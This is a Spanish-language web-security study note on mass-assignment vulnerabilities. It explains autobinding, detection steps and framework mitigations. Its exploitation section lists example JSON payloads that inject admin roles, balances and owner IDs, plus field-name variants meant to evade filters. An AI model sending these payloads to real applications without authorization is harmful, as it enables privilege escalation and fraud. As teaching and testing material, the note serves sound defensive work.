---
tags:
  - seguridad-web
  - owasp
  - mass-assignment
aliases:
  - Mass Assignment
  - Asignación masiva
  - Autobinding
---

# Mass Assignment

**El Mass Assignment (asignación masiva) ocurre cuando un framework vincula automáticamente los campos de una petición a las propiedades de un objeto o modelo, permitiendo al atacante asignar atributos que no debería controlar (rol, saldo, `is_admin`) añadiéndolos al cuerpo de la petición.**

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Frameworks como Rails, Laravel, Spring, Django o Express ofrecen *autobinding*: `User.new(params)` mapea cada clave del JSON/form a un atributo del modelo. Si el desarrollador no restringe qué campos son asignables, el atacante incluye propiedades sensibles que el formulario legítimo nunca envía. También se conoce como *autobinding* o *object injection*; es la causa de muchas escaladas de privilegios "por un campo extra".

## Detección y pruebas
Localiza endpoints que crean o actualizan objetos (registro, edición de perfil, ajustes). Inspecciona el modelo (respuestas GET suelen revelar los nombres de atributos) y añade campos candidatos al cuerpo: `role`, `is_admin`, `verified`, `balance`, `user_id`, `permissions`. Compara la respuesta y el estado resultante.

## Explotación / payloads
**Escalada de privilegios al registrarse:**

```json
POST /api/register
{ "user": "ana", "pass": "x", "role": "admin", "is_admin": true }
```

**Apropiación de objetos / cambio de dueño:**

```json
PATCH /api/account
{ "email": "yo@mail.com", "account_balance": 999999, "user_id": 1 }
```

**Anidamiento y atributos relacionados** (algunos ORMs aceptan objetos anidados):

```json
{ "name": "ana", "group": { "id": 1, "name": "admins" } }
```

**Variantes de nombre y formato** para sortear filtros parciales:

```
isAdmin / is_admin / admin / role[name]=admin / user.role=admin
```

## Mitigación
- Usar **listas de permitidos** (allowlist) de campos asignables: `strong parameters` (Rails), `$fillable` (Laravel), DTOs explícitos, `@JsonIgnore` (Spring).
- Nunca exponer el modelo de base de datos directamente al binding; separar modelo de entrada (DTO) del de persistencia.
- Marcar atributos sensibles como de solo lectura o gestionarlos solo en el servidor.
- Revisar los valores por defecto del framework: muchos hacen autobinding **abierto** salvo configuración.

## Herramientas
- **Burp Suite** (Repeater/Intruder) — añadir campos y enumerar atributos.
- **Param Miner** — descubrir parámetros aceptados no documentados.

---
🔗 Relacionado: [[ORM Leak]] · [[Parámetros ocultos]] · [[IDOR]] · [[Errores de lógica de negocio]]
📚 Fuente: [PayloadsAllTheThings — Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment) (MIT, © Swissky)
